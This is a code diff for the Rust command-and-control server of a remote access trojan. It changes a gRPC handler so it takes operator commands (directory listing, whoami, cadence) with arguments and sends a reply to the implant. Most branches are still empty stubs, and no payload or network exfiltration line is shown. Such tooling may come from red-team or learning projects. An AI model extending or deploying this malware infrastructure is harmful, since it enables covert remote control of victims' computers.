@@ -1,4 +1,4 @@
-use remote_access_trojan::rat::{OperatorCommand, RatCommand};
+use remote_access_trojan::rat::{OperatorCommand, OperatorRequest, OperatorResponse, RatCommand};
 use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
 use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
 use remote_access_trojan::rat::schedule_command_server::{ScheduleCommand, ScheduleCommandServer};
@@ -99,13 +99,15 @@ pub struct MyScheduleCommand {}
 
 #[tonic::async_trait]
 impl ScheduleCommand for MyScheduleCommand {
-    async fn send(&self, request: Request<CommandRequest>) -> Result<Response<Empty>, Status> {
+    async fn send(&self, request: Request<OperatorRequest>) -> Result<Response<OperatorResponse>, Status> {
         // Get the request from the operator and figure out what to do with it
-        let command = OperatorCommand::from_i32(request.into_inner().command).unwrap();
+        let inner = request.into_inner();
+        let command = OperatorCommand::from_i32(inner.command).unwrap();
+        let arguments = inner.arguments;
         // Run the applicable command
         let _command_result = match command {
             OperatorCommand::OpCadence => {
-                // Passthrough
+                println!("got a cadence {arguments}!")
             },
             OperatorCommand::OpDir => {
                 // Passthrough
@@ -140,10 +142,15 @@ impl ScheduleCommand for MyScheduleCommand {
             OperatorCommand::OpWhoami => {
                 // Passthrough
             }
+            _ => {
+                // I think this isn't possible?
+            }
         };
         // Respond to the implant basically say 'done'
         Ok(Response::new(
-            Empty {}
+            OperatorResponse {
+                data: "yup".to_string()
+            }
         ))
     }
 }
